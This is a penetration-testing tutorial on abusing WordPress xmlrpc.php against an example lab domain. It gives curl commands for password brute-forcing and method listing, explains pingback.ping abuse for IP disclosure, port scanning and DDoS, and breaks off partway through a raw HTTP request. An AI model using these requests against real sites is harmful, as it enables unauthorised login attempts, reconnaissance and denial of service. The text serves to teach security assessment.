# Attacking WordPress 'xmlrpc.php'
It is important to note that `xmlrpc.php` being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, `xmlrpc.php` can facilitate some enumeration and exploitation activities, though.
## Scenario Example
Suppose we are assessing the security of a WordPress instance residing in http://blog.inlanefreight.com. 

Through enumeration activities, we identified a valid username, `admin`, and that `xmlrpc.php` is enabled. 

Identifying if `xmlrpc.php` is enabled is as easy as requesting `xmlrpc.php` on the domain we are assessing.

We can mount a password brute-forcing attack through `xmlrpc.php`, as follows:
```shell
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
- We will receive a `403 faultCode` error if the credentials are not valid.

Here we can see a successful login attempt through `xmlrpc.php`.

You may ask how we identified the correct method to call (_system.listMethods_). We did that by going through the well-documented [Wordpress code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with `xmlrpc.php`, as follows:
```shell
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
- Inside the list of available methods above, [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API) is included. 
- `pingback.ping` allows for XML-RPC pingbacks. According to WordPress, a [pingback](https://wordpress.com/support/comments/pingbacks/) is a special type of comment thatâ€™s created when you link to another blog post, as long as the other blog is set to accept pingbacks.

If pingbacks are available, they can facilitate:
- **IP Disclosure -** An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
- **Cross-Site Port Attack (XSPA) -** An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
- **Distributed Denial of Service Attack (DDoS) -** An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.

An IP Disclosure attack could be mounted if `xmlrpc.php` is enabled and the `pingback.ping` method is available.
- XSPA and DDoS attacks can be mounted similarly.

Suppose that the WordPress instance residing in http://blog.inlanefreight.com is protected by Cloudflare. As we already identified, it also has `xmlrpc.php` enabled, and the `pingback.ping` method is available.

As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from http://blog.inlanefreight.com, verifying the pingback and exposing http://blog.inlanefreight.com 's public IP address.
```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293
